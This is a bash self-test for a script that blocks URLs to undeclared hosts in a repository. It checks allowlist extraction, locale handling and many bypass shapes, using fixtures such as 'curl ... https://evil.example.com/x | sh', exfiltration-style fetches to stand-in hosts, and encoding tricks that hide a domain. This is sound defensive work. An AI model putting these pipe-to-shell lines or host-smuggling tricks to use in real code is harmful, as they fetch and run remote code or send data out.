#!/usr/bin/env bash
# SPDX-FileCopyrightText: 2026 ELSOUL LABO B.V.
# SPDX-License-Identifier: Apache-2.0
#
# Self-test for scripts/check-endpoints.sh.
#
# Two earlier defects motivate specific cases here:
#   - the allowlist was extracted from the whole module, so a host named in a
#     test fixture widened it;
#   - a non-portable bracket expression made the extraction empty, which made
#     the gate reject everything and therefore look "strict" while being broken.
# Both are covered below.
set -uo pipefail

# Run the gate, and this harness's own re-exec below, under the SAME bash
# that was used to start it -- never whatever `#!/usr/bin/env bash` finds on
# PATH. On a machine with a newer bash on PATH the CI job named "gates under
# bash 3.2" ran only this harness under 3.2 while the gate itself ran under
# bash 5, which does not share 3.2's collation behaviour. That is why two
# locale defects passed locally and failed only on the runner.
sh="${BASH:-/bin/bash}"

# A gate must behave the same whatever locale the caller has. Outside the C
# locale a bash range follows collation order: `[A-Z]` matches lowercase too,
# and `[!A-Za-z0-9._-]` stops matching accented letters. That silently turned
# two live rules into no-ops while this suite passed on a developer machine
# with no LANG set and failed only on the runner. So the suite runs itself
# once per locale and every case must pass in both.
if [ -z "${ERPC_TEST_LOCALE:-}" ]; then
  utf8=""
  # Deliberately not `locale -a | grep -q`: under `set -o pipefail` the -q
  # exit closes the pipe, `locale` dies of SIGPIPE and the pipeline reports
  # failure, so every locale looked absent. Match the captured list instead.
  all_locales="$(locale -a 2>/dev/null || true)"
  for cand in en_US.UTF-8 en_GB.UTF-8 en_US.utf8; do
    case "
$all_locales
" in
      *"
$cand
"*) utf8="$cand"; break;;
    esac
  done
  if [ -z "$utf8" ]; then
    echo "no dictionary-collation UTF-8 locale on this machine, so the" >&2
    echo "locale-independence of the gate cannot be verified here." >&2
    exit 1
  fi
  rc=0
  for loc in C "$utf8"; do
    printf '== locale %s ==\n' "$loc"
    ERPC_TEST_LOCALE="$loc" LC_ALL="$loc" LANG="$loc" "$sh" "$0" "$@" || rc=1
  done
  exit "$rc"
fi

repo_root="$(git rev-parse --show-toplevel)"
gate="$repo_root/scripts/check-endpoints.sh"

allowlist_src="$repo_root/crates/erpc-core/src/endpoints.rs"

pass=0
fail=0
# Like `check`, but asserts WHY the gate blocked. Needed where two different
# checks would both block the same sample: an exit code then proves nothing
# about the one under test. `w7` below is the case that taught this -- it
# passed with the balanced-expression matcher deleted, because the truncated
# host `{{` is not allowlisted either.
check_msg() {
  local name="$1" rel="$2" content="$3" want="$4"
  local abs="$repo_root/$rel"
  mkdir -p "$(dirname "$abs")"
  printf '%s\n' "$content" > "$abs"
  local out rc
  out="$("$sh" "$gate" "$rel" 2>&1)"; rc=$?
  rm -f "$abs"; rmdir -p "$(dirname "$abs")" 2>/dev/null || true
  case "$out" in
    *"$want"*)
      pass=$((pass + 1)); printf 'ok   %s\n' "$name";;
    *)
      fail=$((fail + 1))
      printf 'FAIL %s (exit %s, wanted a report saying "%s")\n%s\n' "$name" "$rc" "$want" "$out";;
  esac
}

sample_dir="tmp-endpoint-test"

check() {
  local name="$1" expect="$2" rel="$3" content="$4"
  local abs="$repo_root/$rel"
  mkdir -p "$(dirname "$abs")"
  # %b so that fixtures can contain \n and exercise multi-line cases.
  printf '%b\n' "$content" > "$abs"
  local out rc
  out="$("$sh" "$gate" "$rel" 2>&1)"; rc=$?
  rm -f "$abs"
  rmdir -p "$(dirname "$abs")" 2>/dev/null || true
  if { [ "$expect" = block ] && [ "$rc" -ne 0 ]; } || { [ "$expect" = allow ] && [ "$rc" -eq 0 ]; }; then
    pass=$((pass + 1)); printf 'ok   %s\n' "$name"
  else
    fail=$((fail + 1)); printf 'FAIL %s (expected %s, exit %s)\n%s\n' "$name" "$expect" "$rc" "$out"
  fi
}

# --- the extraction itself --------------------------------------------------

extracted=$(awk '
  /^#\[cfg\(test\)\]/ { exit }
  /^pub const [A-Z_]+: &\[/ { inside = 1 }
  inside { print }
  inside && /\];/ { inside = 0 }
' "$allowlist_src" | grep -v '("' | grep -oE '"[^"]+"' | tr -d '"' | sort -u)

if [ "$(printf '%s\n' "$extracted" | grep -c .)" -ge 10 ]; then
  pass=$((pass + 1)); printf 'ok   allowlist extraction is non-empty\n'
else
  fail=$((fail + 1)); printf 'FAIL allowlist extraction is non-empty (a broken regex makes the gate reject everything)\n'
fi

if printf '%s\n' "$extracted" | grep -q 'evil'; then
  fail=$((fail + 1)); printf 'FAIL allowlist must not absorb hosts from the test module\n'
else
  pass=$((pass + 1)); printf 'ok   allowlist stops at the test module\n'
fi


# A host named in a comment inside a const array must not widen the allowlist:
# the extraction strips `//` to end of line.
probe_src="$(mktemp)"
cat > "$probe_src" <<'RS'
pub const SERVICE_HOSTS: &[&str] = &[
    // formerly "exfil.example.com", kept for reference
    "auth-api.erpc.global",
];
#[cfg(test)]
mod tests { const X: &str = "fixture.example.com"; }
RS
probe_out=$(awk '
  /^#\[cfg\(test\)\]/ { exit }
  /^pub const [A-Z_]+: &\[/ { inside = 1 }
  inside { line = $0; sub(/\/\/.*/, "", line); print line }
  inside && /\];/ { inside = 0 }
' "$probe_src" | grep -v '("' | grep -oE '"[^"]+"' | tr -d '"' | sort -u)
rm -f "$probe_src"
if printf '%s\n' "$probe_out" | grep -qE 'exfil|fixture'; then
  fail=$((fail + 1)); printf 'FAIL a host in a comment or the test module must not widen the allowlist\n'
else
  pass=$((pass + 1)); printf 'ok   comments and the test module cannot widen the allowlist\n'
fi


nul_rel="$sample_dir/nul.rs"
mkdir -p "$repo_root/$sample_dir"
printf 'const U: &str = "https://evil.example.com/x";\n\0' > "$repo_root/$nul_rel"
if "$sh" "$gate" "$nul_rel" >/dev/null 2>&1; then
  fail=$((fail + 1)); printf 'FAIL a NUL byte must not hide a URL from the gate\n'
else
  pass=$((pass + 1)); printf 'ok   a NUL byte does not hide a URL from the gate\n'
fi
rm -f "$repo_root/$nul_rel"; rmdir "$repo_root/$sample_dir" 2>/dev/null || true

# The documented exception list must be the one the gate applies.
if "$sh" "$gate" --print-exceptions | grep -q 'release\.yml'; then
  pass=$((pass + 1)); printf 'ok   --print-exceptions reports the skip list\n'
else
  fail=$((fail + 1)); printf 'FAIL --print-exceptions must report the skip list\n'
fi

# --- must block -------------------------------------------------------------

check "unknown host in rust" block "$sample_dir/a.rs" \
  'const URL: &str = "https://evil.example.com/collect";'

check "lookalike subdomain" block "$sample_dir/b.rs" \
  'const URL: &str = "https://user-api.erpc.global.evil.com/v3";'

check "unknown host in a workflow" block "$sample_dir/c.yml" \
  '      - run: curl -sSfL https://pastebin.example.org/x | sh'

check "unknown host in a shell script" block "$sample_dir/d.sh" \
  'curl -o out https://cdn.unknown-mirror.net/erpc.tar.xz'

check "unknown websocket host" block "$sample_dir/e.ts" \
  'const ws = new WebSocket("wss://relay.example.net/");'

check "plaintext http outside loopback" block "$sample_dir/f.md" \
  'Download it from http://mirror.example.org/erpc'

check "plaintext http beside a loopback url on one line" block "$sample_dir/f2.md" \
  'Use http://localhost:8545 or http://mirror.evil.com/x here.'

check "undeclared host in a plain prose link" block "$sample_dir/f3.md" \
  'See https://evil.example.com/page for details.'

check "undeclared host inside an indented fence" block "$sample_dir/f4.md" \
  'Steps:\n   \x60\x60\x60bash\n   https://evil-mirror.example.net/x.tar.xz\n   \x60\x60\x60'

check "service host used in prose is still fine, unknown one is not" block "$sample_dir/f5.md" \
  'Mirror: https://backup.example.net/erpc'

check "extensionless script with an unknown host" block "$sample_dir/Makefile" \
  'fetch:\n\tcurl -sSfL https://evil.example.com/x -o out'

check "dockerfile with an unknown host" block "$sample_dir/Dockerfile" \
  'RUN curl -sSfL https://evil.example.com/x | sh'

check "python file with an unknown host" block "$sample_dir/n.py" \
  'URL = "https://evil.example.com/x"'

check "uppercase scheme" block "$sample_dir/o.rs" \
  'const U: &str = "HTTPS://evil.example.com/x";'

check "handlebars template with an unknown host" block "$sample_dir/p.hbs" \
  '<a href="https://evil.example.com">x</a>'

check "markdown cargo install from an unknown host" block "$sample_dir/r.md" \
  'Install with \x60cargo install --git https://evil.example.com/erpc\x60'

check "empty template appended to a literal host" block "$sample_dir/v.ts" \
  'fetch(\x60https://evil.example.com${""}/x\x60)'

check "workflow expression appended to a literal host" block "$sample_dir/w.yml" \
  '      - run: curl https://evil.example.com${{ env.NOTHING }}/x'

check "command substitution appended to a literal host" block "$sample_dir/x.sh" \
  'curl "https://evil.example.com$(true)/x"'

check "loopback lookalike is not treated as loopback" block "$sample_dir/y.md" \
  'Download http://localhost.evil.com/x'

check "documentation host is not allowed in code" block "$sample_dir/y2.rs" \
  'const U: &str = "https://keepachangelog.com/";'

check "escaped slashes do not hide a URL" block "$sample_dir/y0.json" \
  '{"u": "https:\\/\\/evil.example.com/x"}'

check "non-ASCII host is reported, not silently unmatched" block "$sample_dir/y3.rs" \
  'const U: &str = "https://\xd0\xb5vil.example.com/x";'

check "homograph label cannot satisfy the snapshot pattern" block "$sample_dir/y4.rs" \
  'const U: &str = "https://solana-snapshot-\xd0\xb0ms.erpc.global/x";'

# This case used to assert `allow`, on the reasoning that an expression at
# the start of a host leaves nothing to check. It leaves the registrable
# domain, which is the part that decides where the request goes.
check "an expression at the start still has its domain checked" block "$sample_dir/y5.sh" \
  'curl https://\x60hostname\x60.evil.com/x'

check "a host that is only a backtick expression is skipped" allow "$sample_dir/y5b.sh" \
  'curl https://\x60hostname\x60/x'

check "a backtick after a literal prefix is still checked" block "$sample_dir/y6.sh" \
  'curl https://evil.example.com\x60x\x60/y'

check "backslash escape in a python host" block "$sample_dir/z1.py" \
  'U = "https://\\x65vil.example.com/x"'

check "backslash escape in a typescript host" block "$sample_dir/z2.ts" \
  'const u = "https://\\x65rpc-exfil.example.net/collect";'

check "backslash escape in a rust host" block "$sample_dir/z3.rs" \
  'const U: &str = "https://\\u{65}vil.example.com/x";'

check "escape after an allowlisted prefix (typescript)" block "$sample_dir/z1b.ts" \
  'const u = "https://github.com\\x2eevil.example.net/c";'

check "escape after an allowlisted prefix (python)" block "$sample_dir/z2b.py" \
  'U = "https://install.erpc.global\\x2eevil.example.net/x"'

check "escape after an allowlisted prefix (rust)" block "$sample_dir/z3b.rs" \
  'const U: &str = "https://github.com\\u{2e}evil.example.net/x";'

check "plaintext ws outside loopback" block "$sample_dir/z4.rs" \
  'const W: &str = "ws://relay.example.net/";'

# --- must allow -------------------------------------------------------------

check "allowlisted service host" allow "$sample_dir/g.rs" \
  'const AUTH: &str = "https://auth-api.erpc.global/oauth/token";'

check "allowlisted distribution host" allow "$sample_dir/h.sh" \
  'curl -sSfL https://github.com/elsoul/erpc-cli/releases/download/v0.1.0/release-manifest.json'

check "the removed release mirror is no longer allowed" block "$sample_dir/h2.sh" \
  'curl -sSfL https://dl.erpc.global/v0.1.0/release-manifest.json'

check "snapshot mirror matched by pattern" allow "$sample_dir/i.rs" \
  'const SNAP: &str = "https://solana-snapshot-fra.erpc.global/latest";'

check "loopback over plain http" allow "$sample_dir/j.rs" \
  'const CB: &str = "http://127.0.0.1:53123/callback";'

check "template expression as the host" allow "$sample_dir/k.yml" \
  '      - run: curl -sSfL "https://${{ env.MIRROR }}/erpc.tar.xz"'

check "declared documentation host in prose" allow "$sample_dir/l.md" \
  'See https://keepachangelog.com/en/1.1.0/ for the format.'

check "code span beside a declared documentation link" allow "$sample_dir/l2.md" \
  'See the [\x60serde\x60 guide](https://semver.org/) for details.'

check "a command verb inside an ordinary sentence" allow "$sample_dir/l3.md" \
  'Our CI uses https://semver.org to go install coverage.'

check "declared host in an install command" allow "$sample_dir/q.md" \
  'Run \x60curl -sSfL https://install.erpc.global | bash\x60 to install.'

check "fenced code block with an allowlisted host" allow "$sample_dir/aa.md" \
  '\x60\x60\x60bash\ngit clone https://github.com/elsoul/erpc-cli\n\x60\x60\x60'


check "ws on loopback" allow "$sample_dir/z5.rs" \
  'const W: &str = "ws://127.0.0.1:20026/v1/session/ws";'

check "leading dollar-brace host is skipped" allow "$sample_dir/z6.sh" \
  'curl -sSfL "https://${MIRROR}/erpc.tar.xz"'

check "leading command substitution host is skipped" allow "$sample_dir/z7.sh" \
  'curl -sSfL "https://$(cat host)/erpc.tar.xz"'

check "documentation host in a .txt file" allow "$sample_dir/z8.txt" \
  'See https://semver.org for the versioning scheme.'

# An expression after an allowlisted prefix. This is the mechanism the
# backslash case covers, in its other form: the literal prefix is declared,
# the expression can be empty, and the registrable domain is the attacker's.
# The existing template cases all use evil.example.com as the PREFIX, so they
# block on the prefix alone and would pass with the suffix check removed.
check "empty template after an allowlisted prefix (typescript)" block "$sample_dir/t1.ts" \
  'const a = `https://github.com${""}.evil.example.net/x`;'

check "template after an allowlisted prefix (github actions)" block "$sample_dir/t2.yml" \
  '      - run: curl https://github.com${{ env.NOTHING }}.evil.example.net/x'

check "command substitution after an allowlisted prefix (shell)" block "$sample_dir/t3.sh" \
  'curl "https://github.com$(true).evil.example.net/x"'

check "backtick substitution after an allowlisted prefix (shell)" block "$sample_dir/t4.sh" \
  'curl "https://github.com`true`.evil.example.net/x"'

check "a second template hides the suffix too" block "$sample_dir/t5.ts" \
  'const a = `https://solana-snapshot-${a}x${b}.erpc.global`;'

check "the literal parts may not add a dot of their own" block "$sample_dir/t6.ts" \
  'const a = `https://solana-snapshot-${r}.evil.example.net.erpc.global.x`;'

# ... and the shape HOST_PATTERNS exists to permit must still pass, or the
# rule above is just a ban on templates.
check "declared host pattern with a template label" allow "$sample_dir/t7.ts" \
  'const u = `https://solana-snapshot-${region}.erpc.global`;'

check "template in the path of a declared host" allow "$sample_dir/t8.sh" \
  'curl "https://user-api.erpc.global/v1/${id}"'

# The seam. An earlier arrangement answered the allowlist question first and
# returned, so a host matching the declared pattern carried a plaintext
# scheme, a Cyrillic label or an escape past checks this gate states as
# absolute. Each of these four passed, and each is a different check.
check "plaintext http survives a pattern template" block "$sample_dir/s1.ts" \
  'const u = `http://solana-snapshot-${region}.erpc.global/x`;'

check "plaintext ws survives a pattern template" block "$sample_dir/s2.ts" \
  'const u = `ws://solana-snapshot-${region}.erpc.global/x`;'

check "homograph label beside a pattern template" block "$sample_dir/s3.ts" \
  'const u = `https://solana-snapshot-\xd0\xb0${r}.erpc.global/x`;'

check "escape sequence beside a pattern template" block "$sample_dir/s4.ts" \
  'const u = `https://solana-snapshot-\x5cx2e${r}.erpc.global/x`;'

# An expression at the START of the host. What follows it is the registrable
# domain, so "there is no literal to check" is only true when nothing
# literal follows at all.
check "expression first, attacker domain after (dollar-brace)" block "$sample_dir/e1.ts" \
  'const u = `https://${A}.evil.example.net/x`;'

check "expression first, attacker domain after (handlebars)" block "$sample_dir/e2.yml" \
  '      - run: curl https://{{ host }}.evil.example.net/x'

check "expression first, attacker domain after (command substitution)" block "$sample_dir/e3.sh" \
  'curl "https://$(h).evil.example.net/x"'

check "the same host through userinfo answers the same way" block "$sample_dir/e4.sh" \
  'curl "https://u@${A}.evil.example.net/x"'

# The dot rule, in both directions. Without it a declared pattern would
# vouch for a different registrable domain. The existing t6 case fails the
# ends-with test before the dot rule is reached, so it does not pin this.
check "a dot in the tail moves the domain" block "$sample_dir/dot1.ts" \
  'const u = `https://solana-snapshot-${r}.evil.erpc.global/x`;'

check "a dot in the head moves the domain" block "$sample_dir/dot2.ts" \
  'const u = `https://solana-snapshot-x.y${r}.erpc.global/x`;'

# The matcher must never lose a URL. An earlier version rewrote expressions
# to placeholders before scanning; `[^}]*` ran to the next closer anywhere
# on the line, so an unbalanced opener before a URL and a closer after it
# replaced the URL itself and nothing downstream ever ran. These three
# failed open and silent: no finding, exit 0.
check "an unbalanced brace before a URL must not swallow it" block "$sample_dir/w1.ts" \
  'const tpl = "use ${ph"; const b = "https://collector.evil.example.net/x"; const e = "}";'

check "an unbalanced brace in a shell line must not swallow it" block "$sample_dir/w2.sh" \
  'RUN echo "${" && curl https://evil.example.com/x && echo "}"'

check "an unbalanced paren in prose must not swallow it" block "$sample_dir/w3.md" \
  'See `$(` (and https://evil.example.com/x) for details.'

# An unterminated opener inside the host. The text after it is literal and
# is the registrable domain, so this is not the "nothing to check" case.
check "unterminated brace keeps its domain checked" block "$sample_dir/w4.ts" \
  'const u = `https://${x.evil.example.net`;'

check "unterminated paren keeps its domain checked" block "$sample_dir/w5.ts" \
  'const u = `https://$(x.evil.example.net`;'

check "unterminated handlebars keeps its domain checked" block "$sample_dir/w6.ts" \
  'const u = `https://{{x.evil.example.net`;'

# A space inside a balanced expression must not end the URL.
# Asserted on the MESSAGE: with the balanced branch removed the host becomes
# `{{`, which is not allowlisted either, so a block proves nothing. Only the
# whole-authority read produces "expression in host".
check_msg "a space inside handlebars does not end the URL" "$sample_dir/w7.yml" \
  '      - run: curl https://{{ host }}.evil.example.net/x' \
  'expression in host'

check "a declared host survives a space inside an expression" allow "$sample_dir/w8.yml" \
  '      - run: curl -sSfL "https://${{ env.X }}@user-api.erpc.global/v1"'

# A backtick is also a string quote, so a declared host written in a
# template literal must not be mistaken for an expression host.
check "a declared host in a template literal is not an expression" allow "$sample_dir/w9.ts" \
  'const u = `https://user-api.erpc.global`;'

# A KNOWN LIMIT, and the one shape this gate does not see. The match ends
# at the space, so the host is `\x60cat` and the domain after the space is out
# of reach. Reporting it would need the backtick rule to fire on a tail with
# no dot in it, and that same widening rejects `\x60https://semver.org\x60.` and
# `\x60https://user-api.erpc.global\x60.length`, which are correct lines using
# declared hosts. The narrow rule plus a stated limit beats a wide rule that
# makes the gate wrong about documentation. If a future change makes this
# block, update this case rather than deleting it.
check "KNOWN LIMIT: backtick expression with a space is not seen" allow "$sample_dir/w10.sh" \
  'curl https://\x60cat host\x60.evil.example.net/x'

# The two directions the predicate has to separate, both new here.
check "a backtick followed by another domain is reported" block "$sample_dir/w11.ts" \
  'const a = "https://github.com\x60;evil.example.net/x";'

check "a declared host in a code span ending a sentence is fine" allow "$sample_dir/w12.md" \
  'See \x60https://semver.org\x60. It is the spec.'

check "a declared host followed by a method call is fine" allow "$sample_dir/w13.ts" \
  'const u = \x60https://user-api.erpc.global\x60.trim();'

# The authority has three parts and check_url discards two of them to reach
# the host. Each discard is where the matcher and check_url can disagree,
# and twice a tightening of the matcher broke one without anyone noticing.
# One case per part, in both directions.

# userinfo. A colon is legal there, so a matcher that cannot cross one cuts
# before the @ and reads the userinfo as the host.
check "a password in userinfo does not become the host" block "$sample_dir/a1.sh" \
  'curl "https://github.com:x@evil.example.net/x"'

check "userinfo before a declared host is fine" allow "$sample_dir/a2.sh" \
  'curl "https://u:p@user-api.erpc.global/v1"'

check "an expression in userinfo does not hide the host" block "$sample_dir/a3.yml" \
  '      - run: curl "https://${{ env.X }}@evil.example.net/v1"'

# TWO @ signs. Every URL parser splits the authority at the LAST one, and
# `${hostport##*@}` is written to that rule, so a grammar that stopped at
# the first @ handed over the middle component -- a declared host vouching
# for a destination that is not it.
check "a declared host between two @ signs does not vouch" block "$sample_dir/a7.sh" \
  'curl "https://a@user-api.erpc.global@evil.example.net/x"'

check "a password before two @ signs does not vouch either" block "$sample_dir/a8.sh" \
  'curl "https://u:p@user-api.erpc.global@evil.example.net/x"'

# The boundary guard: in a code file the match must end where an authority
# legally can. A non-numeric port is not a port, so the match stops short
# and the host is a prefix of what a reader sees.
check "a match that stops inside an authority is reported" block "$sample_dir/a9.sh" \
  'curl "https://user-api.erpc.global:x.evil.example.net/y"'

check "the same shape in prose is left alone" allow "$sample_dir/a10.md" \
  'See [ERPC](https://erpc.global): the multi-chain endpoint.'

# IP-literal. The brackets are terminal: anything after the ] is a new
# token, never part of this host.
check "a bracketed host does not absorb the next scheme" block "$sample_dir/a4.sh" \
  'curl "https://[::1]https://evil.example.net/x"'

check "a bracketed loopback with a port is fine" allow "$sample_dir/a5.ts" \
  'let u = "https://[::1]:8899/rpc";'

# port. Only a trailing run of digits is one. A colon inside an expression
# is not, and cutting there used to mangle a declared pattern host.
check "a colon inside an expression is not a port" allow "$sample_dir/a6.sh" \
  'curl "https://solana-snapshot-${a:-b}.erpc.global/x"'

# --- the invariant ------------------------------------------------------
#
# Every shape-specific case above pins one bypass. This pins the property
# they all violated: a line holding N URLs must yield N findings' worth of
# scrutiny, never fewer. Three rounds running, the defect was that one match
# absorbed a second URL and `grep -o` then never emitted it -- the gate saw
# one host, approved it, and the absorbed destination was never evaluated.
#
# The check is on the GATE's output, not the matcher's, and it asserts that
# EACH host is named by its own distinct marker domain. Counting lines that
# mention a shared domain was not enough: a report about a merged host
# interpolates that host, so the finding that proves the bug would satisfy
# the count. Distinct markers cannot be satisfied that way.
#
# The assertion is that each marker appears SOMEWHERE in the output, not
# that each is the host of its own finding. One report cannot name both
# today, because that host would need a :// inside it and the grammar
# forbids one -- but if a message is ever widened to quote surrounding
# text, tighten this to match the host field of each finding.
invariant() {
  local name="$1" content="$2"; shift 2
  local rel="$sample_dir/inv.sh" abs="$repo_root/$sample_dir/inv.sh"
  mkdir -p "$(dirname "$abs")"
  printf '%s\n' "$content" > "$abs"
  local out missing="" m
  out="$("$sh" "$gate" "$rel" 2>&1)"
  rm -f "$abs"; rmdir -p "$(dirname "$abs")" 2>/dev/null || true
  for m in "$@"; do
    case "$out" in *"$m"*) ;; *) missing="$missing $m";; esac
  done
  if [ -z "$missing" ]; then
    pass=$((pass + 1)); printf 'ok   %s\n' "$name"
  else
    fail=$((fail + 1))
    printf 'FAIL %s (never named:%s)\n%s\n' "$name" "$missing" "$out"
  fi
}

invariant "a second URL inside a command substitution is still judged" \
  'curl "https://one.evil.example.net/x$(echo https://two.evil.example.net/y)"' \
  one.evil.example.net two.evil.example.net

invariant "a second URL inside handlebars is still judged" \
  'a https://one.evil.example.net/x {{ y https://two.evil.example.net/z }} b' \
  one.evil.example.net two.evil.example.net

invariant "a second URL spliced across two string literals is still judged" \
  'const a = "https://one.evil.example.net/${x"; const b = "https://two.evil.example.net/y}";' \
  one.evil.example.net two.evil.example.net

invariant "a second URL inside a GitHub Actions expression is still judged" \
  'a https://one.evil.example.net/x ${{ y https://two.evil.example.net/z }} b' \
  one.evil.example.net two.evil.example.net

invariant "nested command substitutions do not hide a URL" \
  'curl "https://one.evil.example.net/$(a $(b https://two.evil.example.net/y))"' \
  one.evil.example.net two.evil.example.net

invariant "a second scheme in the port position is still judged" \
  'curl https://one.evil.example.net:https://two.evil.example.net/x' \
  one.evil.example.net two.evil.example.net

invariant "two plain URLs on one line are both named" \
  'const a = "https://one.evil.example.net/1"; const b = "https://two.evil.example.net/2";' \
  one.evil.example.net two.evil.example.net

printf '\n%s passed, %s failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
